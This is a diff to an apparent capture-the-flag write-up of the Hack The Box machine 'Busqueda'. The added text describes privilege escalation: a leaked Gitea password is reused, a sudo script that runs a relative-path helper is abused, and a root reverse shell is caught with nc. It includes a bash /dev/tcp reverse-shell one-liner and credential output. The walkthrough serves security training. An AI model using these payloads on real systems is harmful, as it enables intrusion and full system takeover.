@@ -105,6 +105,7 @@ diff --git a/src/searchor/main.py b/src/searchor/main.py
 index 9a35010..6e61e78 100644
 --- a/src/searchor/main.py
 +++ b/src/searchor/main.py
+
 @@ -29,9 +29,7 @@ def cli():
  @click.argument("query")
  def search(engine, query, open, copy):
@@ -195,7 +196,7 @@ I'll invoke a full tty and proceed with enumeration.
 
 ## Privilege escalation
 
-### Git credentials
+### Gitea credentials
 
 Reviewing the directory home of the application, we can see it has a .git directory.
 
@@ -207,6 +208,7 @@ drwxr-xr-x 4 root     root     4096 Apr  4  2023 ..
 -rw-r--r-- 1 www-data www-data 1124 Dec  1  2022 app.py
 drwxr-xr-x 8 www-data www-data 4096 Mar  9 17:43 .git
 drwxr-xr-x 2 www-data www-data 4096 Dec  1  2022 templates
+
 svc@busqueda:/var/www/app$ git show
 fatal: detected dubious ownership in repository at '/var/www/app'
 To add an exception for this directory, call:
@@ -326,7 +328,7 @@ I'll login with ssh and enumerate the command we can run as sudo.
 
 ### system-chekup.py
 
-Looks like a custom python code to run some commands on the system.
+Looks like a custom python code to run a list of commands on the system, mainly related to docker.
 
 ```bash
 svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py -h
@@ -337,7 +339,7 @@ Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)
      full-checkup  : Run a full system checkup
 ```
 
-Using the option `docker-ps` reveals a couple of docker containers that exist on the machine.
+Using the option `docker-ps` reveals a couple of docker containers that exist on the machine. One for gitea and the other belongs to a sql database.
 
 ```bash
 svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps
@@ -358,8 +360,185 @@ svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-insp
 {"Hostname":"960873171e2e","Domainname":"","User":"","AttachStdin":false,"AttachStdout":false,"AttachStderr":false,"ExposedPorts":{"22/tcp":{},"3000/tcp":{}},"Tty":false,"OpenStdin":false,"StdinOnce":false,"Env":["USER_UID=115","USER_GID=121","GITEA__database__DB_TYPE=mysql","GITEA__database__HOST=db:3306","GITEA__database__NAME=gitea","GITEA__database__USER=gitea","GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh","PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin","USER=git","GITEA_CUSTOM=/data/gitea"],"Cmd":["/bin/s6-svscan","/etc/s6"],"Image":"gitea/gitea:latest","Volumes":{"/data":{},"/etc/localtime":{},"/etc/timezone":{}},"WorkingDir":"","Entrypoint":["/usr/bin/entrypoint"],"OnBuild":null,"Labels":{"com.docker.compose.config-hash":"e9e6ff8e594f3a8c77b688e35f3fe9163fe99c66597b19bdd03f9256d630f515","com.docker.compose.container-number":"1","com.docker.compose.oneoff":"False","com.docker.compose.project":"docker","com.docker.compose.project.config_files":"docker-compose.yml","com.docker.compose.project.working_dir":"/root/scripts/docker","com.docker.compose.service":"server","com.docker.compose.version":"1.29.2","maintainer":"maintainers@gitea.io","org.opencontainers.image.created":"2022-11-24T13:22:00Z","org.opencontainers.image.revision":"9bccc60cf51f3b4070f5506b042a3d9a1442c73d","org.opencontainers.image.source":"https://github.com/go-gitea/gitea.git","org.opencontainers.image.url":"https://github.com/go-gitea/gitea"}}
 ```
 
-This reveals some credentials. I'll try them with the other account showed in the gitea server, Administrator.
+This reveals some credentials, which belong to a database but I'll try them with the other account showed in the gitea server first which is Administrator.
+
+<p align="center">
+  <a href="/assets/images/busqueda/Captura9.png" class="glightbox">
+    <img src="/assets/images/busqueda/Captura9.png" width="700">
+  </a>
+</p>
+
+It works and we can login in Administrator. I can also see there's another repository that is private named scripts.
+
+<p align="center">
+  <a href="/assets/images/busqueda/Captura10.png" class="glightbox">
+    <img src="/assets/images/busqueda/Captura10.png" width="700">
+  </a>
+</p>
+
+Reviewing the codes, it shares similarities with the command we can run as sudo with svc. The one that is particularly interesting is `system-checkup.py`.
+
+### System-checkup.py
+
+```python
+#!/bin/bash
+import subprocess
+import sys
+
+actions = ['full-checkup', 'docker-ps','docker-inspect']
+
+def run_command(arg_list):
+    r = subprocess.run(arg_list, capture_output=True)
+    if r.stderr:
+        output = r.stderr.decode()
+    else:
+        output = r.stdout.decode()
+
+    return output
 
 
+def process_action(action):
+    if action == 'docker-inspect':
+        try:
+            _format = sys.argv[2]
+            if len(_format) == 0:
+                print(f"Format can't be empty")
+                exit(1)
+            container = sys.argv[3]
+            arg_list = ['docker', 'inspect', '--format', _format, container]
+            print(run_command(arg_list)) 
+        
+        except IndexError:
+            print(f"Usage: {sys.argv[0]} docker-inspect <format> <container_name>")
+            exit(1)
+    
+        except Exception as e:
+            print('Something went wrong')
+            exit(1)
+    
+    elif action == 'docker-ps':
+        try:
+            arg_list = ['docker', 'ps']
+            print(run_command(arg_list)) 
+        
+        except:
+            print('Something went wrong')
+            exit(1)
+
+    elif action == 'full-checkup':
+        try:
+            arg_list = ['./full-checkup.sh']
+            print(run_command(arg_list))
+            print('[+] Done!')
+        except:
+            print('Something went wrong')
+            exit(1)
+            
+
+if __name__ == '__main__':
+
+    try:
+        action = sys.argv[1]
+        if action in actions:
+            process_action(action)
+        else:
+            raise IndexError
+
+    except IndexError:
+        print(f'Usage: {sys.argv[0]} <action> (arg1) (arg2)')
+        print('')
+        print('     docker-ps     : List running docker containers')
+        print('     docker-inspect : Inpect a certain docker container')
+        print('     full-checkup  : Run a full system checkup')
+        print('')
+        exit(1)
+```
+
+This one looks like it's the script we can run as sudo, as it also contains functions for the docker commands, `inspect` and `ps`. It also contains the action of `full-checkup`. Trying this action on it's own will just give us an error message.
+
+```bash
+svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
+Something went wrong
+```
+
+Now that we have the source code we can now why is it failing.
+
+```python
+    elif action == 'full-checkup':
+        try:
+            arg_list = ['./full-checkup.sh']
+            print(run_command(arg_list))
+            print('[+] Done!')
+        except:
+            print('Something went wrong')
+            exit(1)
+```
+
+The script executes full-checkup.sh using a relative path. Since we can run it with sudo privileges, an attacker can place a malicious full-checkup.sh in the current directory, causing the script to execute the fake script as root and gain a privileged shell.
+
+We'll simply create the fake script in the same terminal as svc using a one-liner and modify it's permissions so everyone can execute it.
+
+```bash
+svc@busqueda:~$ printf '#!/bin/bash\n/bin/bash -i >& /dev/tcp/10.10.16.3/9001 0>&1\n' > full-checkup.sh && chmod +x full-checkup.sh
+
+svc@busqueda:~$ ls -la
+total 40
+drwxr-x--- 4 svc  svc  4096 Mar 10 16:29 .
+drwxr-xr-x 3 root root 4096 Dec 22  2022 ..
+lrwxrwxrwx 1 root root    9 Feb 20  2023 .bash_history -> /dev/null
+-rw-r--r-- 1 svc  svc   220 Jan  6  2022 .bash_logout
+-rw-r--r-- 1 svc  svc  3771 Jan  6  2022 .bashrc
+drwx------ 2 svc  svc  4096 Feb 28  2023 .cache
+-rwxrwxr-x 1 svc  svc    58 Mar 10 16:29 full-checkup.sh
+-rw-rw-r-- 1 svc  svc    76 Apr  3  2023 .gitconfig
+drwxrwxr-x 5 svc  svc  4096 Jun 15  2022 .local
+lrwxrwxrwx 1 root root    9 Apr  3  2023 .mysql_history -> /dev/null
+-rw-r--r-- 1 svc  svc   807 Jan  6  2022 .profile
+lrwxrwxrwx 1 root root    9 Feb 20  2023 .searchor-history.json -> /dev/null
+-rw-r----- 1 root svc    33 Mar 10 16:08 user.txt
+```
+
+Next, I'll just run system-checkup with the option of full-checkup in the directory where I have the fake script.
+
+```bash
+svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
+
+```
+
+I receive the shell in our listener as root.
+
+```bash
+┌──(kali㉿kali)-[~/hackthebox/recap/busqueda]
+└─$ nc -lvnp 9001
+listening on [any] 9001 ...
+connect to [10.10.16.3] from (UNKNOWN) [10.129.228.217] 43590
+root@busqueda:/home/svc# whoami
+whoami
+root
+
+root@busqueda:/home/svc# cd ~
+cd ~
+
+root@busqueda:~# ls -la
+ls -la
+total 60
+drwx------  9 root root 4096 Mar 10 16:08 .
+drwxr-xr-x 19 root root 4096 Mar  1  2023 ..
+lrwxrwxrwx  1 root root    9 Feb 20  2023 .bash_history -> /dev/null
+-rw-r--r--  1 root root 3106 Oct 15  2021 .bashrc
+drwx------  3 root root 4096 Mar  1  2023 .cache
+drwx------  3 root root 4096 Mar  1  2023 .config
+-rw-r-----  1 root root  430 Apr  3  2023 ecosystem.config.js
+-rw-r--r--  1 root root  104 Apr  3  2023 .gitconfig
+drwxr-xr-x  3 root root 4096 Mar  1  2023 .local
+-rw-------  1 root root   50 Feb 20  2023 .my.cnf
+lrwxrwxrwx  1 root root    9 Feb 20  2023 .mysql_history -> /dev/null
+drwxr-xr-x  4 root root 4096 Mar  1  2023 .npm
+drwxr-xr-x  5 root root 4096 Mar 10 16:07 .pm2
+-rw-r--r--  1 root root  161 Jul  9  2019 .profile
+-rw-r-----  1 root root   33 Mar 10 16:08 root.txt
+drwxr-xr-x  4 root root 4096 Apr  3  2023 scripts
+drwx------  3 root root 4096 Mar  1  2023 snap
+```
 
 
